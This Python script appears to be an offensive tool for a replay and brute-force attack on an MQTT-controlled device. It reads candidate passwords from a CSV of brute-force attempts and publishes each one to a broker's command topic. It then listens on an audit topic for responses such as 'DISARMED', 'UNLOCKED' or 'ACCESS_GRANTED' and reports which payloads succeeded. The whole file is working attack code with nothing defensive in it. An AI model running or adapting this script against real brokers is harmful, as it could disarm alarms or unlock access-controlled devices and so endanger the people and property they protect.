import argparse
import time

from replay_helpers import (
    create_mqtt_client,
    connect_and_start,
    load_dataset,
    load_replay_config,
    publish_payloads,
    stop_and_disconnect,
)

config = load_replay_config()

attack_results = []
current_payload = None
success_detected = False


def on_audit_message(client, userdata, msg):
    global success_detected, current_payload
    payload = msg.payload.decode(errors="replace")
    print(f"📊 AUDIT: {payload}")

    success_indicators = ["DISARMED", "UNLOCKED", "ACCESS_GRANTED", "SUCCESS"]
    if any(indicator in payload.upper() for indicator in success_indicators):
        success_detected = True
        print(f"✅ SUCCESS DETECTED for payload: {current_payload}")


def publish_dataset_payloads(payloads, delay=0.5, wait_for_response=2.0):
    global attack_results, current_payload, success_detected

    if not payloads:
        print("No payloads available to publish.")
        return

    audit_client = create_mqtt_client("Hacker_Audit_Listener", on_audit_message)
    connect_and_start(audit_client, config["broker_ip"], config["port"])
    audit_client.subscribe(config["audit_topic"])

    publish_client = create_mqtt_client("Hacker_Replay_Device")
    connect_and_start(publish_client, config["broker_ip"], config["port"])

    attack_results = []

    for i, payload in enumerate(payloads, start=1):
        current_payload = payload
        success_detected = False

        publish_client.publish(config["cmd_topic"], payload)
        print(f"[{i}] Published payload: {payload}")

        time.sleep(wait_for_response)

        attack_results.append(
            {
                "index": i,
                "payload": payload,
                "result": "SUCCESS" if success_detected else "NO_RESPONSE",
            }
        )

        time.sleep(max(0.1, delay - wait_for_response))

    stop_and_disconnect(publish_client)
    stop_and_disconnect(audit_client)

    successful = sum(1 for r in attack_results if r["result"] == "SUCCESS")
    total = len(attack_results)

    print("\n" + "=" * 50)
    print("🎯 ATTACK RESULTS SUMMARY")
    print("=" * 50)
    print(f"Total payloads tested: {total}")
    print(f"Successful attacks: {successful}")
    print(f"Success rate: {successful/total*100:.1f}%" if total > 0 else "Success rate: N/A")

    if successful > 0:
        print("\n✅ SUCCESSFUL PAYLOADS:")
        for result in attack_results:
            if result["result"] == "SUCCESS":
                print(f"  - {result['payload']}")
    else:
        print("\n❌ No successful attacks detected.")

    print("\n✅ Dataset-driven replay finished.")


def main():
    parser = argparse.ArgumentParser(description="Dataset-driven MQTT replay attack.")
    parser.add_argument("--dataset", default="brute_attempts_1777965941.csv", help="CSV dataset filename inside app/dataset/")
    parser.add_argument("--payload-column", default="password", help="CSV column to use as published payload")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between published messages")
    parser.add_argument("--limit", type=int, default=0, help="Maximum payloads to publish")
    parser.add_argument("--wait-response", type=float, default=2.0, help="Seconds to wait for success response after each payload")
    args = parser.parse_args()

    payloads = load_dataset(args.dataset, config["dataset_root"], args.payload_column)
    if args.limit > 0:
        payloads = payloads[: args.limit]

    print(f"📡 Replaying {len(payloads)} payloads from dataset '{args.dataset}' to topic '{config['cmd_topic']}'...")
    print(f"Broker: {config['broker_ip']}:{config['port']}")
    print(f"Listening for responses on audit topic: {config['audit_topic']}")
    print(f"Waiting {args.wait_response}s for each response...")
    publish_dataset_payloads(payloads, args.delay, args.wait_response)


if __name__ == "__main__":
    main()
